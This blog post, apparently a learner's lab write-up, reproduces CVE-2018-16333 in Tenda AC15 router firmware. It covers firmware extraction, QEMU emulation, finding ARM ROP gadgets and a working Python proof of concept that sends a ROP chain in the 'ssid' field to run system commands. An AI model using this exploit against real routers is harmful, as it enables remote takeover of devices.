@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>tenda_2018-16333栈溢出漏洞复现 | Ya0rk の Blog</title><meta name="author" content="Ya0rk"><meta name="copyright" content="Ya0rk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是真正意义上第一次复现IOT漏洞，也是参考了许多大佬的博客，算是“站在巨人的肩膀上”进行入门学习了。 固件获取固件地址：pwn/IOT/Tenda_CVE-2018-16333 at master · Snowleopard-bin/pwn (github.com) 这里有poc和固件。 漏洞分析前期处理首先是使用binwalk提取固件。 binwalk -Me U">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tenda_2018-16333栈溢出漏洞复现">
+<meta property="og:url" content="http://example.com/2024/09/09/tenda_2018-16333%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Ya0rk の Blog">
+<meta property="og:description" content="这是真正意义上第一次复现IOT漏洞，也是参考了许多大佬的博客，算是“站在巨人的肩膀上”进行入门学习了。 固件获取固件地址：pwn/IOT/Tenda_CVE-2018-16333 at master · Snowleopard-bin/pwn (github.com) 这里有poc和固件。 漏洞分析前期处理首先是使用binwalk提取固件。 binwalk -Me U">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/longlin.jpg">
+<meta property="article:published_time" content="2024-09-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-11T02:04:06.451Z">
+<meta property="article:author" content="Ya0rk">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="IOT复现">
+<meta property="article:tag" content="路由器">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/longlin.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/09/09/tenda_2018-16333%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'tenda_2018-16333栈溢出漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-11 10:04:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Ya0rk の Blog"><span class="site-name">Ya0rk の Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">tenda_2018-16333栈溢出漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-08T16:00:00.000Z" title="发表于 2024-09-09 00:00:00">2024-09-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-11T02:04:06.451Z" title="更新于 2024-09-11 10:04:06">2024-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT/">IOT</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="tenda_2018-16333栈溢出漏洞复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>这是真正意义上第一次复现IOT漏洞，也是参考了许多大佬的博客，算是“站在巨人的肩膀上”进行入门学习了。</p>
+<h1 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h1><p>固件地址：<a target="_blank" rel="noopener" href="https://github.com/Snowleopard-bin/pwn/tree/master/IOT/Tenda_CVE-2018-16333">pwn/IOT/Tenda_CVE-2018-16333 at master · Snowleopard-bin/pwn (github.com)</a></p>
+<p>这里有poc和固件。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前期处理"><a href="#前期处理" class="headerlink" title="前期处理"></a>前期处理</h2><p>首先是使用<code>binwalk</code>提取固件。</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin --run-as=root</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据官方解释进入<code>squashfs-root/bin</code>文件夹下找到了漏洞程序<code>httpd</code>。</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240909222001.png"></p>
+<p>这也和做pwn一样，首先要知道漏洞程序才能做接下来的分析，只不过pwn题是把漏洞程序直接给我们了。在这里就需要我们自己去找了，目前我还不知道如何定位这样的程序，等以后深入了解慢慢积累吧 : )</p>
+<p>然后我们看看程序开启了什么保护机制：这里是只开了NX保护，并且程序是arm架构下的32位程序。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">❯ checksec httpd</span><br><span class="line">[*] 'squashfs-root/bin/httpd'</span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8000)</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="定位漏洞函数"><a href="#定位漏洞函数" class="headerlink" title="定位漏洞函数"></a>定位漏洞函数</h2><p>根据CVE的描述，<code>There is a buffer overflow vulnerability in the router’s web server. While processing the ssid parameter for a POST request, the value is directly used in a sprintf call to a local variable placed on the stack, which overrides the return address of the function, causing a buffer overflow.</code>漏洞的原因是web服务在处理post请求时，对<code>ssid</code>参数直接复制到栈上的一个局部变量中导致栈溢出。根据<code>ssid</code>字符串定位到<code>form_fast_setting_wifi_set</code>函数。</p>
+<p>使用IDA字符串功能找<code>ssid</code>字符串可能并不准，我们可以使用以下技巧：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ALT + T 搜索字符串</span><br><span class="line">CTRL + T 重复上一个搜索</span><br><span class="line"></span><br><span class="line">ALT + B 二进制字节序列方式搜索</span><br><span class="line">CTRL + B 重复上一个搜索</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有一定pwn基础的同学应该能够比较敏锐的发现，这里<code>strcpy</code>没有做检查就复制给<code>dest</code>，会造成栈溢出。（这也是为什么听师傅说这一类函数容易出现漏洞）</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240909223448.png"></p>
+<p>但是我们需要注意，我们通过第一个<code>strcpy</code>溢出<code>s</code>造成栈溢出，那么必然会覆盖了<code>src</code>指针；如果这里没有注意到，假设<code>src</code>被覆盖为<code>aaaa</code>，那么在第二次<code>strcpy</code>时取<code>src</code>指针地址内容就会报错。所以为了保证地址合法，我们将<code>src</code>覆盖为一个可读地址。(并且为了避免截断，不要包含<code>\x00</code>)</p>
+<p>可以选择如下地址：</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240909224225.png"></p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>寻找gadget：<code>libc.so.0</code>文件存在<code>squashfs-root/lib</code>目录下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.0 --only "pop" |grep r3</span><br><span class="line">gadget1 : 0x00018298 : pop {r3, pc}</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ./libc.so.0 --only "mov|blx"</span><br><span class="line">gadget2 : 0x00040cb8 : mov r0, sp ; blx r3</span><br></pre></td></tr></tbody></table></figure>
+
+<p>BLX：跳转到寄存区reg给出的目的地址处并将返回地址存储到LR（连接寄存器，也即R14）,类似与x86的call。</p>
+<p>过程：</p>
+<ol>
+<li>栈溢出跳到<code>gadget1</code>，控制<code>r3</code>寄存器为<code>system</code>地址，然后控制<code>pc</code>为<code>gadget2</code>地址</li>
+<li>接着程序会跳转到<code>gadget2</code>,我们需要控制<code>r0</code>寄存器为要执行的指令<code>cmd</code></li>
+<li>执行<code>system(cmd)</code></li>
+</ol>
+<h2 id="qemu用户级调试"><a href="#qemu用户级调试" class="headerlink" title="qemu用户级调试"></a>qemu用户级调试</h2><p>先安装<code>qemu</code>。</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">apt install qemu</span><br><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt-get -y install qemu-user-static  qemu-user</span><br></pre></td></tr></tbody></table></figure>
+
+<p>回到<code>squashfs-root</code>目录下：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cp $(which qemu-arm-static) .</span><br><span class="line">chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></tbody></table></figure>
+
+<p>启动<code>httpd</code>后发现程序卡住：</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910115017.png"></p>
+<p>在IDA中使用字符串搜索和交叉引用定位到函数位置：在这里会进行网络<code>check</code>，如果返回值小于0就会<code>sleep</code>,接着再次进入网络<code>check</code>，陷入死循环。</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910115241.png"></p>
+<p>所以我们将<code>MOV R3,R0</code>patch为<code>MOV R3,#1</code>，这样就能跳出循环了。</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910115445.png"></p>
+<p>进修改后的<code>httpd</code>文件覆盖原文件，再次运行：</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910125606.png"></p>
+<p>按照同样的方法定位错误：</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910125714.png"></p>
+<p>patch后：将<code>MOV R3,R0</code>patch为<code>MOV R3,#1</code></p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910125959.png"></p>
+<p>再次运行：发现监听的ip地址不对</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910130128.png"></p>
+<p>尝试在本机建立虚拟网桥br0并重新执行程序：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装配置网络的工具</span></span><br><span class="line">apt-get install bridge-utils</span><br><span class="line">apt-get install uml-utilities</span><br><span class="line"> </span><br><span class="line">sudo brctl addbr br0      # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 eth0   # 在 br0 中添加一个接口</span><br><span class="line">sudo ifconfig br0 up      # 启用 br0 接口</span><br><span class="line">sudo dhclient br0         # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到IP地址正确了。</p>
+<p><img src="/img/my_post_img/Pasted%20image%2020240910193700.png"></p>
+<p><strong>注意：这里使用用户级模拟的程序会导致复现不了漏洞，所用我们使用以下的qemu系统级模拟</strong></p>
+<h2 id="qemu系统级模拟"><a href="#qemu系统级模拟" class="headerlink" title="qemu系统级模拟"></a>qemu系统级模拟</h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">宿主机</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装配置网络的工具</span></span><br><span class="line">apt-get install bridge-utils</span><br><span class="line">apt-get install uml-utilities</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我的宿主机的上网的网卡为ens33，并且存在多个虚拟网卡</span></span><br><span class="line">ifconfig ens33 down    # 首先关闭宿主机网卡接口</span><br><span class="line">brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">brctl addif br0 ens33        # 在 br0 中添加一个接口</span><br><span class="line">brctl stp br0 on            #打开生成树协议</span><br><span class="line">brctl setfd br0 2                  # 设置 br0 的转发延迟</span><br><span class="line">brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line"></span><br><span class="line">brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line"></span><br><span class="line">tunctl -t tap0             # 创建一个 tap0 接口</span><br><span class="line">brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">ifconfig tap0 192.168.198.100/24 up        #为tap0分配ip地址</span><br><span class="line"></span><br><span class="line">brctl showstp br0                   # 显示 br0 的各个接口         </span><br></pre></td></tr></tbody></table></figure>
+
+<p>下载的依赖：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></tbody></table></figure>
+
+<p>启动：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append "root=/dev/mmcblk0p2 console=ttyAMA0" \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输入密码账号均为：root</p>
+<p>启动之后，eth0网卡没有分配ip地址，并且没有像参考文章中所说那样就可以与宿主机通信（也就是ping不通），这时需要再qemu虚拟机中给eth0网卡设置ip地址。然后就能愉快地使用scp上传文件系统了。</p>
+<p><strong>注意，这里必须要关闭宿主机的ens32或者ens33网卡，<code>sudo ifconfig ens32 down</code>,这样qemu虚拟机才能<code>ping</code>通宿主机的<code>br0</code>网卡。</strong></p>
+<hr>
+<p>在前面网络通信卡了好久（呜呜呜</p>
+<p>测试一下宿主机和qemu虚拟机是否能ping通：</p>
+<p><img src="/Pasted%20image%2020240910211704.png"></p>
+<p>测试通过，接下来实现将宿主机中的<code>squashfs-root</code>目录传到qemu虚拟机中，我们使用<code>scp</code>服务。</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在宿主机中压缩整个文件目录</span></span><br><span class="line">sudo tar -zcvf ../squashfs-root.tar.gz ./</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在qemu虚拟机中，下载文件到/root目录下</span></span><br><span class="line">scp iot@192.168.15.100:/home/iot/Desktop/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root.tar.gz /root/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/Pasted%20image%2020240910211624.png"></p>
+<p>解压目录并删除压缩包：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">tar xzf squashfs-root.tar.gz &amp;&amp; rm squashfs-root.tar.gz</span><br></pre></td></tr></tbody></table></figure>
+
+<p>已经解压出文件目录了：</p>
+<p><img src="/Pasted%20image%2020240910211818.png"></p>
+<p><strong>挂载文件目录</strong>：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount -o bind /dev /root/dev &amp;&amp; mount -t proc /proc /root/proc</span><br></pre></td></tr></tbody></table></figure>
+
+<p>切换文件工作目录并打开<code>sh</code>终端，这时程序会将<code>/root</code>目录当做根目录：</p>
+<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /root sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/Pasted%20image%2020240910212211.png"></p>
+<p>为qemu虚拟机添加虚拟网卡并激活：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">brctl addif br0</span><br><span class="line">ifconfig br0 192.168.15.76/24 up</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/Pasted%20image%2020240910212433.png"></p>
+<p>终于到了这里，最后一步就是启动程序了：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./bin/httpd/ &amp;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>qemu虚拟机退出方法：同时按ctrl+a之后，再按c，出现(qemu)时输入q即可退出。</strong></p>
+<p><img src="/Pasted%20image%2020240910230435.png"></p>
+<p>接下来就是宿主机远程调试<code>qemu</code>中运行的<code>httpd</code>了。</p>
+<hr>
+<p>去<a target="_blank" rel="noopener" href="https://github.com/b0ldfrev/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver">github</a>中下载静态编译好的gdbserver:</p>
+<p>用<code>scp</code>将gdbserver下载到虚拟机。</p>
+<p>使用gdbserver启动httpd程序，设置端口为9999：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./gdbserver 0.0.0.0:9999 ./bin/httpd</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在宿主机中，使用gdb-multiarch来进行远程调试:</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">gdb-multiarch -q ./bin/httpd</span><br><span class="line">set arch arm</span><br><span class="line">tar rem 192.168.198.76:9999</span><br><span class="line">b *0x6775c</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure>
+
+<p>关闭地址随机化：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">"echo hello"</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">qemu-user</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#libc_base = 0xf659c000</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">qemu-system</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">libc_base = <span class="number">0x76dab000</span></span><br><span class="line">dosystemcmd = <span class="number">0x76f930f0</span></span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x5A270</span></span><br><span class="line">readable_addr = libc_base + <span class="number">0x64144</span></span><br><span class="line">mov_r0_ret_r3 = libc_base + <span class="number">0x40cb8</span></span><br><span class="line">pop_r3 = libc_base + <span class="number">0x18298</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x60</span>) + p32(readable_addr) + <span class="string">'b'</span>*(<span class="number">0x20</span>-<span class="number">8</span>)</span><br><span class="line">payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.198.76/goform/fast_setting_wifi_set"</span></span><br><span class="line">cookie = {<span class="string">"Cookie"</span>:<span class="string">"password=12345"</span>}</span><br><span class="line">data = {<span class="string">"ssid"</span>: payload}</span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></tbody></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Ya0rk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/09/tenda_2018-16333%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://example.com/2024/09/09/tenda_2018-16333%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ya0rk の Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><a class="post-meta__tags" href="/tags/IOT%E5%A4%8D%E7%8E%B0/">IOT复现</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a></div><div class="post_share"><div class="social-share" data-image="/img/longlin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/10/%E7%BD%91%E5%8D%A1%E5%92%8C%E7%BD%91%E5%85%B3/" title="网卡和网关"><img class="cover" src="/img/cute.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网卡和网关</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/07/%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/" title="除自身以外数组的乘积"><img class="cover" src="/img/cloud.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">除自身以外数组的乘积</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/31/Vivotek%E8%BF%9C%E7%A8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Vivotek远程栈溢出漏洞复现"><img class="cover" src="/img/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Vivotek远程栈溢出漏洞复现</div></div></a></div><div><a href="/2024/08/01/aarch64-ret2-libc/" title="aarch64_ret2_libc"><img class="cover" src="/img/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">aarch64_ret2_libc</div></div></a></div><div><a href="/2024/08/28/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%BB%95%E8%BF%87canary/" title="c++异常处理绕过canary"><img class="cover" src="/img/chika.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-28</div><div class="title">c++异常处理绕过canary</div></div></a></div><div><a href="/2024/09/02/vsyscall%E6%BB%91%E5%8A%A8%E7%BB%95%E8%BF%87pie/" title="vsyscall滑动绕过pie"><img class="cover" src="/img/chika.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-02</div><div class="title">vsyscall滑动绕过pie</div></div></a></div><div><a 